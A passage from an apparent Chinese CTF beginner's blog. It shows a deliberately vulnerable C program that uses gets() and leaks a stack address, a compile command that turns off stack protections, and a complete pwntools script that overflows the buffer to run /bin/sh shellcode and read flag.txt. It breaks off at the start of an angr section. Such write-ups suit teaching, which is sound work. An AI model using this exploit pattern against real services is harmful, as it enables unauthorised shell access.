<!DOCTYPE html><html class="scroll-smooth" lang="zh-CN"> <head><meta charset="utf-8"><meta content="width=device-width, initial-scale=1.0" name="viewport"><title>CTF 入门的一些笔记 • Eritque Arcus</title><link rel="icon" href="/favicon.png" type="image/png"><link href="/manifest.webmanifest" rel="manifest"><link href="https://ikuyo.dev/2022/10/14/PWN-wr1teups0/" rel="canonical"><meta content="CTF 入门的一些笔记 • Eritque Arcus" name="title"><meta content="Eritque Arcus's blog" name="description"><meta content="Eritque Arcus" name="author"><meta content="article" property="og:type"><meta content="CTF 入门的一些笔记" property="og:title"><meta content="Eritque Arcus's blog" property="og:description"><meta content="https://ikuyo.dev/2022/10/14/PWN-wr1teups0/" property="og:url"><meta content="Eritque Arcus" property="og:site_name"><meta content="zh_CN" property="og:locale"><meta content="1200" property="og:image:width"><meta content="630" property="og:image:height"><meta content="Eritque Arcus" property="article:author"><meta content="2022-10-14T07:05:28.000Z" property="article:published_time"><meta content="summary_large_image" property="twitter:card"><meta content="https://ikuyo.dev/2022/10/14/PWN-wr1teups0/" property="twitter:url"><meta content="CTF 入门的一些笔记" property="twitter:title"><meta content="Eritque Arcus's blog" property="twitter:description"><link href="/sitemap-index.xml" rel="sitemap"><link href="/rss.xml" title="Blog" rel="alternate" type="application/rss+xml"><link href="/notes/rss.xml" title="Notes" rel="alternate" type="application/rss+xml"><link href="https://webmention.io/ikuyo.dev/webmention" rel="webmention"><meta content="Astro v5.14.4" name="generator"><link href="https://github.com/Nambers" rel="me"><link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="anonymous" data-unfont><link rel="preload" as="style" onload="this.rel='stylesheet'" href="https://fonts.googleapis.com/css2?family=Major Mono Display&family=Space Grotesk&family=Noto Sans SC&family=LXGW WenKai Mono TC&display=swap" data-unfont><style>@font-face{font-family:Maple Mono;font-style:normal;font-display:swap;font-weight:400;src:url(/_astro/maple-mono-latin-400-normal.C5QbKxa2.woff2) format("woff2"),url(/_astro/maple-mono-latin-400-normal.BgUYpi45.woff) format("woff")}
</style>
<link rel="stylesheet" href="/_astro/_page_.Qxx8qG3y.css"><script type="module" src="/_astro/page.CwTOY3h6.js"></script></head> <body class="bg-global-bg text-global-text mx-auto flex min-h-screen max-w-7xl flex-col px-4 pt-16 text-sm font-normal antialiased sm:px-8"> <script>
	const lightModePref = window.matchMedia("(prefers-color-scheme: light)");

	function getUserPref() {
		const storedTheme = typeof localStorage !== "undefined" && localStorage.getItem("theme");
		return storedTheme || (lightModePref.matches ? "light" : "dark");
	}

	function setTheme(newTheme) {
		if (newTheme !== "light" && newTheme !== "dark") {
			return console.warn(
				`Invalid theme value '${newTheme}' received. Expected 'light' or 'dark'.`,
			);
		}

		const root = document.documentElement;

		// root already set to newTheme, exit early
		if (newTheme === root.getAttribute("data-theme")) {
			return;
		}

		root.setAttribute("data-theme", newTheme);

		if (typeof localStorage !== "undefined") {
			localStorage.setItem("theme", newTheme);
		}
	}

	// initial setup
	setTheme(getUserPref());

	// View Transitions hook to restore theme
	document.addEventListener("astro:after-swap", () => setTheme(getUserPref()));

	// listen for theme-change custom event, fired in src/components/ThemeToggle.astro
	document.addEventListener("theme-change", (e) => {
		setTheme(e.detail.theme);
	});

	// listen for prefers-color-scheme change.
	lightModePref.addEventListener("change", (e) => setTheme(e.matches ? "light" : "dark"));
</script> <a class="sr-only focus:not-sr-only focus:fixed focus:start-1 focus:top-1.5" href="#main">skip to content
</a> <header class="group relative mb-28 flex w-full items-center sm:ps-20" id="main-header"> <div class="flex w-full sm:flex-col"> <div class="flex w-full items-center sm:relative sm:inline-block"> <a aria-current="false" class="inline-flex items-center sm:relative sm:inline-block" href="/"> <img src="/avatar.png" alt="Avatar" class="me-3 h-16 w-16 rounded-full sm:absolute sm:-start-18 sm:me-0 sm:h-16 sm:w-16"> <span class="font-display text-accent ps-3 text-4xl font-bold tracking-wide whitespace-nowrap dark:drop-shadow-[0_0_2px_white] dark:drop-shadow-[0_0_4px_cyan] dark:drop-shadow-[0_0_8px_cyan] dark:drop-shadow-[0_0_16px_rgba(0,255,255,0.5)]"> Eritque Arcus </span> </a> </div> <nav aria-label="Main menu" class="bg-global-bg/85 absolute -inset-x-4 top-14 hidden w-full flex-col items-end gap-y-4 rounded-md py-4 shadow backdrop-blur-sm group-[.menu-open]:z-50 group-[.menu-open]:flex sm:static sm:z-auto sm:-ms-4 sm:mt-1 sm:flex sm:flex-row sm:items-center sm:rounded-none sm:bg-transparent sm:py-0 sm:ps-4 sm:shadow-none sm:backdrop-blur-none" id="navigation-menu"> <div class="text-accent sm:divide-accent sm:divide-x"> <a aria-current="false" class="px-2 py-2 underline-offset-2 hover:underline sm:py-0" data-astro-prefetch href="/archive/"> Archive </a><a aria-current="false" class="px-2 py-2 underline-offset-2 hover:underline sm:py-0" data-astro-prefetch href="/about/"> About </a><a aria-current="false" class="px-2 py-2 underline-offset-2 hover:underline sm:py-0" data-astro-prefetch href="/math-notes/"> Notes </a><a aria-current="false" class="px-2 py-2 underline-offset-2 hover:underline sm:py-0" data-astro-prefetch href="/ctf-cheatsheet/"> CTF-QuickRef </a><a aria-current="false" class="px-2 py-2 underline-offset-2 hover:underline sm:py-0" data-astro-prefetch href="/music/"> Music </a><a aria-current="false" class="px-2 py-2 underline-offset-2 hover:underline sm:py-0" data-astro-prefetch href="https://photos.ikuyo.dev"> Photos </a> </div> <div class="flex sm:ps-28"> <site-search class="ms-auto" id="search"> <button class="hover:text-accent flex h-9 w-9 cursor-pointer items-center justify-center rounded-md" aria-keyshortcuts="Control+K Meta+K" data-open-modal disabled> <svg aria-hidden="true" class="h-7 w-7" fill="none" height="16" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" viewBox="0 0 24 24" width="16" xmlns="http://www.w3.org/2000/svg"> <path d="M0 0h24v24H0z" stroke="none"></path> <path d="M3 10a7 7 0 1 0 14 0 7 7 0 1 0-14 0M21 21l-6-6"></path> </svg> <span class="sr-only">Open Search</span> </button> <dialog aria-label="search" class="bg-global-bg h-full max-h-full w-full max-w-full border border-zinc-400 shadow-sm backdrop:backdrop-blur-sm open:flex sm:mx-auto sm:mt-16 sm:mb-auto sm:h-max sm:max-h-[calc(100%-8rem)] sm:min-h-[15rem] sm:w-5/6 sm:max-w-[48rem] sm:rounded-md"> <div class="dialog-frame flex grow flex-col gap-4 p-6 pt-12 sm:pt-6"> <button class="ms-auto cursor-pointer rounded-md bg-zinc-200 p-2 font-semibold dark:bg-zinc-700" data-close-modal>Close</button> <div class="search-container"> <div id="cactus__search"></div> </div> </div> </dialog> </site-search> <script type="module" src="/_astro/Search.astro_astro_type_script_index_0_lang.rgeqRwRC.js"></script> <theme-toggle class="ms-2 sm:ms-4"> <button class="hover:text-accent relative h-9 w-9 cursor-pointer rounded-md p-2" type="button"> <span class="sr-only">Dark Theme</span> <svg aria-hidden="true" class="absolute start-1/2 top-1/2 h-7 w-7 -translate-x-1/2 -translate-y-1/2 scale-100 opacity-100 transition-all dark:scale-0 dark:opacity-0" fill="none" focusable="false" id="sun-svg" stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path d="M12 18C15.3137 18 18 15.3137 18 12C18 8.68629 15.3137 6 12 6C8.68629 6 6 8.68629 6 12C6 15.3137 8.68629 18 12 18Z" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M22 12L23 12" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M12 2V1" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M12 23V22" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M20 20L19 19" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M20 4L19 5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M4 20L5 19" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M4 4L5 5" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> <path d="M1 12L2 12" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path> </svg> <svg aria-hidden="true" class="absolute start-1/2 top-1/2 h-7 w-7 -translate-x-1/2 -translate-y-1/2 scale-0 opacity-0 transition-all dark:scale-100 dark:opacity-100" fill="none" focusable="false" id="moon-svg" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path d="M0 0h24v24H0z" fill="none" stroke="none"></path> <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z"></path> <path d="M17 4a2 2 0 0 0 2 2a2 2 0 0 0 -2 2a2 2 0 0 0 -2 -2a2 2 0 0 0 2 -2"></path> <path d="M19 11h2m-1 -1v2"></path> </svg> </button> </theme-toggle> <script type="module" src="/_astro/ThemeToggle.astro_astro_type_script_index_0_lang.C1tldoqx.js"></script> </div> </nav> </div> <mobile-button class="mb-15"> <button aria-expanded="false" aria-haspopup="menu" class="group relative ms-4 h-7 w-7 sm:invisible sm:hidden" id="toggle-navigation-menu" type="button"> <span class="sr-only">Open main menu</span> <svg aria-hidden="true" class="absolute start-1/2 top-1/2 h-full w-full -translate-x-1/2 -translate-y-1/2 transition-all group-aria-expanded:scale-0 group-aria-expanded:opacity-0" fill="none" focusable="false" id="line-svg" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path d="M3.75 9h16.5m-16.5 6.75h16.5" stroke-linecap="round" stroke-linejoin="round"></path> </svg> <svg aria-hidden="true" class="text-accent absolute start-1/2 top-1/2 h-full w-full -translate-x-1/2 -translate-y-1/2 scale-0 opacity-0 transition-all group-aria-expanded:scale-100 group-aria-expanded:opacity-100" class="text-accent" fill="none" focusable="false" id="cross-svg" stroke="currentColor" stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path d="M6 18L18 6M6 6l12 12" stroke-linecap="round" stroke-linejoin="round"></path> </svg> </button> </mobile-button> </header> <script type="module" src="/_astro/Header.astro_astro_type_script_index_0_lang.DuSsDY4R.js"></script> <main id="main">  <article class="grow break-words" data-pagefind-body> <div id="blog-hero" class="mb-12"><h1 class="title"> CTF 入门的一些笔记 </h1> <div class="flex flex-wrap items-center gap-x-3 gap-y-2"> <p class="font-semibold"> <time datetime="2022-10-14T07:05:28.000Z" title="2022-10-14T07:05:28.000Z">14 October 2022</time> /  7 min read </p>  </div> <div class="mt-2"> <svg aria-hidden="true" class="inline-block h-6 w-6" fill="none" focusable="false" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"> <path d="M0 0h24v24H0z" fill="none" stroke="none"></path> <path d="M7.859 6h-2.834a2.025 2.025 0 0 0 -2.025 2.025v2.834c0 .537 .213 1.052 .593 1.432l6.116 6.116a2.025 2.025 0 0 0 2.864 0l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-6.117 -6.116a2.025 2.025 0 0 0 -1.431 -.593z"></path> <path d="M17.573 18.407l2.834 -2.834a2.025 2.025 0 0 0 0 -2.864l-7.117 -7.116"></path> <path d="M6 9h-.01"></path> </svg> <span class="contents"> <a class="cactus-link inline-block before:content-['#']" data-pagefind-filter="tag:ctf" href="/tags/ctf/"><span class="sr-only">View more blogs with the tag&nbsp;</span>ctf </a> </span>  </div></div> <div class="grid grid-cols-[1fr_auto] gap-10 lg:flex-row lg:items-start"> <details open class="lg:sticky lg:top-12 lg:order-2 lg:-me-32 lg:basis-64"> <summary class="title hover:marker:text-accent cursor-pointer text-lg">Table of Contents</summary> <nav class="ms-4 lg:w-full"> <ol class="mt-4"> <li class> <a class="line-clamp-2 hover:text-accent mt-3" href="#shellcode-注入"><span aria-hidden="true" class="me-0.5">#</span>shellcode 注入</a>  </li><li class> <a class="line-clamp-2 hover:text-accent mt-3" href="#angr-破解输入"><span aria-hidden="true" class="me-0.5">#</span>angr 破解输入</a>  </li><li class> <a class="line-clamp-2 hover:text-accent mt-3" href="#angr---2"><span aria-hidden="true" class="me-0.5">#</span>angr - 2</a>  </li><li class> <a class="line-clamp-2 hover:text-accent mt-3" href="#rsa"><span aria-hidden="true" class="me-0.5">#</span>RSA</a>  </li><li class> <a class="line-clamp-2 hover:text-accent mt-3" href="#z3-solver"><span aria-hidden="true" class="me-0.5">#</span>Z3 solver</a>  </li> </ol> </nav> </details> <div class="prose max-w-none prose-base prose-code:font-normal prose-headings:font-semibold prose-headings:text-accent-2 prose-headings:before:absolute prose-headings:before:-ms-4 prose-headings:before:text-gray-600 prose-headings:hover:before:text-accent sm:prose-headings:before:content-['#'] sm:prose-th:before:content-none">  <h2 id="shellcode-注入"><a class="not-prose" href="#shellcode-注入">shellcode 注入</a></h2>
<p>需要解的程序, 目的是获取同目录下的 <code>flag.txt</code> 内容</p>
<div class="expressive-code"><link rel="stylesheet" href="/_astro/ec.oaceo.css"><script type="module" src="/_astro/ec.p1z7b.js"></script><figure class="frame has-title"><figcaption class="header"><span class="title">chall.c</span></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:45ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">#include</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">&#x3C;stdio.h></span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">#include</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">&#x3C;stdlib.h></span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">vuln</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">char</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#FFAB70;--1:#AE4B07">buf</span><span style="--0:#E1E4E8;--1:#24292E">[</span><span style="--0:#79B8FF;--1:#005CC5">100</span><span style="--0:#E1E4E8;--1:#24292E">];</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">printf</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"&#x3C;Text 2> </span><span style="--0:#79B8FF;--1:#005CC5">%p\n</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#E1E4E8;--1:#24292E">, buf);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">gets</span><span style="--0:#E1E4E8;--1:#24292E">(buf);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code">
</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">main</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">{</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">char</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#FFAB70;--1:#AE4B07">sample</span><span style="--0:#E1E4E8;--1:#24292E">[</span><span style="--0:#79B8FF;--1:#005CC5">20</span><span style="--0:#E1E4E8;--1:#24292E">];</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">puts</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"&#x3C;Text 1>"</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">fgets</span><span style="--0:#E1E4E8;--1:#24292E">(sample, </span><span style="--0:#F97583;--1:#BF3441">sizeof</span><span style="--0:#E1E4E8;--1:#24292E">(sample) </span><span style="--0:#F97583;--1:#BF3441">-</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">, stdin);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">    </span><span style="--0:#B392F0;--1:#6F42C1">vuln</span><span style="--0:#E1E4E8;--1:#24292E">();</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="#include <stdio.h>#include <stdlib.h>void vuln(void){    char buf[100];    printf(&#x22;<Text 2> %p\n&#x22;, buf);    gets(buf);}void main(void){    char sample[20];    puts(&#x22;<Text 1>&#x22;);    fgets(sample, sizeof(sample) - 1, stdin);    vuln();}"><div></div></button></div></figure></div>
<p>编译命令</p>
<div class="expressive-code"><figure class="frame is-terminal"><figcaption class="header"><span class="title"></span><span class="sr-only">Terminal window</span></figcaption><pre data-language="bash" class="wrap" style="--ecMaxLine:54ch"><code><div class="ec-line"><div class="code"><span style="--0:#B392F0;--1:#6F42C1">gcc</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">chall.c</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">-o</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">chall</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">-fno-stack-protector</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">-z</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">execstack</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="gcc chall.c -o chall -fno-stack-protector -z execstack"><div></div></button></div></figure></div>
<p>可以注意 <code>execstack</code> 这一项.</p>
<p>一开始我本想用第二个 <code>gets</code> 溢出来重写 <code>$rbp</code> 寄存器到 <code>system</code> 的地址, 然后 <code>$rdi</code> 到 <code>/bin/sh</code> 来执行 <code>system("/bin/sh");</code> 以获取命令行, 但是问题出现在拿不到远程的 <code>system</code> 地址.</p>
<p>后来看了一眼网上, 可以用 <code>shellcode</code> 来解决</p>
<div class="expressive-code"><figure class="frame has-title"><figcaption class="header"><span class="title">solve.py</span></figcaption><pre data-language="python" class="wrap" style="--ecMaxLine:89ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">from</span><span style="--0:#E1E4E8;--1:#24292E"> pwn </span><span style="--0:#F97583;--1:#BF3441">import</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># lib = gdb.debug("&#x3C;local file>")</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> remote(</span><span style="--0:#9ECBFF;--1:#032F62">"&#x3C;remote addr>"</span><span style="--0:#E1E4E8;--1:#24292E">, </span><span style="--0:#F97583;--1:#BF3441">&#x3C;</span><span style="--0:#E1E4E8;--1:#24292E">port</span><span style="--0:#F97583;--1:#BF3441">></span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(lib.recv())</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 随便写点什么填充第一个输入</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib.sendline(</span><span style="--0:#F97583;--1:#BF3441">b</span><span style="--0:#9ECBFF;--1:#032F62">"a"</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">re </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> lib.recv()</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(re)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 从第二个输出中获取第二个字符数组的地址</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">addr </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">int</span><span style="--0:#E1E4E8;--1:#24292E">(re[</span><span style="--0:#F97583;--1:#BF3441">-</span><span style="--0:#79B8FF;--1:#005CC5">15</span><span style="--0:#E1E4E8;--1:#24292E">:</span><span style="--0:#F97583;--1:#BF3441">-</span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">], </span><span style="--0:#79B8FF;--1:#005CC5">16</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(re[</span><span style="--0:#F97583;--1:#BF3441">-</span><span style="--0:#79B8FF;--1:#005CC5">15</span><span style="--0:#E1E4E8;--1:#24292E">:</span><span style="--0:#F97583;--1:#BF3441">-</span><span style="--0:#79B8FF;--1:#005CC5">1</span><span style="--0:#E1E4E8;--1:#24292E">])</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 获取 bytes 类型的 system("/bin/sh"); 的 shellcode</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">bash_bytes </span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#E1E4E8;--1:#24292E"> asm(shellcraft.amd64.linux.sh(),</span><span style="--0:#FFAB70;--1:#AE4B07">arch</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#9ECBFF;--1:#032F62">'amd64'</span><span style="--0:#E1E4E8;--1:#24292E">, </span><span style="--0:#FFAB70;--1:#AE4B07">os</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#9ECBFF;--1:#032F62">'linux'</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#79B8FF;--1:#005CC5">print</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#79B8FF;--1:#005CC5">len</span><span style="--0:#E1E4E8;--1:#24292E">(bash_bytes))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 填充 shellcode 到第二个字符数组, 同时用 overflow 重写 `$rbp` 到之前获取的第二个字符数组开头</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib.sendline(bash_bytes </span><span style="--0:#F97583;--1:#BF3441">+</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">b</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#79B8FF;--1:#005CC5">\x00</span><span style="--0:#9ECBFF;--1:#032F62">"</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">*</span><span style="--0:#E1E4E8;--1:#24292E"> (</span><span style="--0:#79B8FF;--1:#005CC5">120</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">-</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">len</span><span style="--0:#E1E4E8;--1:#24292E">(bash_bytes)) </span><span style="--0:#F97583;--1:#BF3441">+</span><span style="--0:#E1E4E8;--1:#24292E"> p64(addr, </span><span style="--0:#FFAB70;--1:#AE4B07">endian</span><span style="--0:#F97583;--1:#BF3441">=</span><span style="--0:#9ECBFF;--1:#032F62">"little"</span><span style="--0:#E1E4E8;--1:#24292E">))</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#99A0A6;--1:#616972"># 获取 flag.txt 内容</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib.sendline(</span><span style="--0:#F97583;--1:#BF3441">b</span><span style="--0:#9ECBFF;--1:#032F62">"cat flag.txt"</span><span style="--0:#E1E4E8;--1:#24292E">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span style="--0:#E1E4E8;--1:#24292E">lib.recv()</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="from pwn import *# lib = gdb.debug(&#x22;<local file>&#x22;)lib = remote(&#x22;<remote addr>&#x22;, <port>)print(lib.recv())# 随便写点什么填充第一个输入lib.sendline(b&#x22;a&#x22;)re = lib.recv()print(re)# 从第二个输出中获取第二个字符数组的地址addr = int(re[-15:-1], 16)print(re[-15:-1])# 获取 bytes 类型的 system(&#x22;/bin/sh&#x22;); 的 shellcodebash_bytes = asm(shellcraft.amd64.linux.sh(),arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)print(len(bash_bytes))# 填充 shellcode 到第二个字符数组, 同时用 overflow 重写 &#x60;$rbp&#x60; 到之前获取的第二个字符数组开头lib.sendline(bash_bytes + b&#x22;\x00&#x22; * (120 - len(bash_bytes)) + p64(addr, endian=&#x22;little&#x22;))# 获取 flag.txt 内容lib.sendline(b&#x22;cat flag.txt&#x22;)lib.recv()"><div></div></button></div></figure></div>
<h2 id="angr-破解输入"><a class="not-prose" href="#angr-破解输入">angr 破解输入</a></h2>
<div class="expressive-code"><figure class="frame has-title"><figcaption class="header"><span class="title">chall.c</span></figcaption><pre data-language="c" class="wrap" style="--ecMaxLine:65ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">#include</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">&#x3C;stdio.h></span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">#include</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">&#x3C;stdlib.h></span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">#include</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#9ECBFF;--1:#032F62">&#x3C;string.h></span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#F97583;--1:#BF3441">char</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#FFAB70;--1:#AE4B07">key</span><span style="--0:#E1E4E8;--1:#24292E">[</span><span style="--0:#79B8FF;--1:#005CC5">50</span><span 